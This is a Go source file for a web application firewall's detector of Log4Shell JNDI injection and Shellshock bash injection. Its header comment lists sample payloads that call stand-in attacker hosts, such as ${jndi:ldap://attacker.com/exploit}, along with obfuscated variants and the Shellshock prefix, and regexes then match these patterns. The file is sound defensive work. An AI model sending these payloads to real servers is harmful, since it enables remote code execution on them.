package semantic

import (
	"context"
	"regexp"
	"strings"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

// Log4ShellDetector detects Log4Shell (CVE-2021-44228) JNDI injection patterns.
//
// Core signatures:
//   - ${jndi:ldap://attacker.com/exploit}
//   - ${jndi:rmi://evil.host/obj}
//   - ${jndi:dns://callback.domain}
//   - Obfuscated variants: ${${::-j}ndi:ldap://...} / ${jndi:${lower:l}dap://...}
//   - Nested lookups: ${${env:ENV_VAR:-j}ndi:ldap://...}
//
// Also covers Shellshock (CVE-2014-6271): () { :;}; /bin/bash -c "..."
type Log4ShellDetector struct{ mode string }

func NewLog4ShellDetector(mode string) *Log4ShellDetector {
	return &Log4ShellDetector{mode: mode}
}

func (d *Log4ShellDetector) ID() string    { return "semantic.log4shell" }
func (d *Log4ShellDetector) Name() string  { return "Log4Shell & Shellshock Detector" }
func (d *Log4ShellDetector) Priority() int { return 340 }

func (d *Log4ShellDetector) Detect(_ context.Context, reqCtx *engine.RequestContext) (*engine.DetectionResult, error) {
	surface := requestText(reqCtx)
	normalized := strings.ToLower(surface)

	// ---- Log4Shell JNDI injection ----
	if rxLog4ShellJNDI.MatchString(normalized) {
		return &engine.DetectionResult{
			Detected:   true,
			DetectorID: d.ID(),
			Category:   "log4shell",
			Severity:   engine.SeverityCritical,
			Action:     actionForMode(d.mode),
			Message:    "Log4Shell JNDI injection detected",
			Confidence: 0.98,
			Payload:    truncateLog4Shell(surface, 200),
		}, nil
	}

	// ---- Obfuscated Log4Shell variants ----
	if rxLog4ShellObfuscated.MatchString(normalized) {
		return &engine.DetectionResult{
			Detected:   true,
			DetectorID: d.ID(),
			Category:   "log4shell",
			Severity:   engine.SeverityCritical,
			Action:     actionForMode(d.mode),
			Message:    "Obfuscated Log4Shell pattern detected",
			Confidence: 0.96,
			Payload:    truncateLog4Shell(surface, 200),
		}, nil
	}

	// ---- Shellshock bash injection ----
	if rxShellshock.MatchString(normalized) {
		return &engine.DetectionResult{
			Detected:   true,
			DetectorID: d.ID(),
			Category:   "shellshock",
			Severity:   engine.SeverityCritical,
			Action:     actionForMode(d.mode),
			Message:    "Shellshock bash injection detected",
			Confidence: 0.97,
			Payload:    truncateLog4Shell(surface, 200),
		}, nil
	}

	return nil, nil
}

// analyzeLog4Shell is the semantic analyzer entry point called from analyzer.go.
func analyzeLog4Shell(candidate semanticCandidate) (Hit, bool) {
	normalized := strings.ToLower(candidate.text)

	// Log4Shell JNDI injection
	if rxLog4ShellJNDI.MatchString(normalized) {
		return hit(candidate, "log4shell", engine.SeverityCritical, 0.98, map[string]bool{
			"syntax: Log4j JNDI lookup expression":                                         true,
			"semantics: remote naming service lookup can load attacker-controlled content": true,
		}), true
	}

	// Obfuscated Log4Shell
	if rxLog4ShellObfuscated.MatchString(normalized) {
		return hit(candidate, "log4shell", engine.SeverityCritical, 0.96, map[string]bool{
			"syntax: obfuscated Log4j lookup expression":                                   true,
			"semantics: remote naming service lookup can load attacker-controlled content": true,
		}), true
	}

	// Shellshock
	if rxShellshock.MatchString(normalized) {
		return hit(candidate, "shellshock", engine.SeverityCritical, 0.97, map[string]bool{
			"syntax: Shellshock function-definition prefix":        true,
			"semantics: trailing shell command execution boundary": true,
		}), true
	}

	return Hit{}, false
}

var (
	// Log4Shell JNDI injection: ${jndi:ldap://...} / ${jndi:rmi://...} / ${jndi:dns://...}
	rxLog4ShellJNDI = regexp.MustCompile(`\$\{jndi:(?:ldap|rmi|dns|iiop|corba|nds)://`)
	// Obfuscated variants: ${${::-j}ndi:...} / ${jndi:${lower:l}dap://...} / ${${env:VAR:-j}ndi:...}
	rxLog4ShellObfuscated = regexp.MustCompile(`\$\{[^}]*(?:jndi|ldap|rmi|dns)[^}]*://`)
	// Shellshock: () { :;}; <command>
	rxShellshock = regexp.MustCompile(`\(\s*\)\s*\{\s*:;\s*\};`)
)

func truncateLog4Shell(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
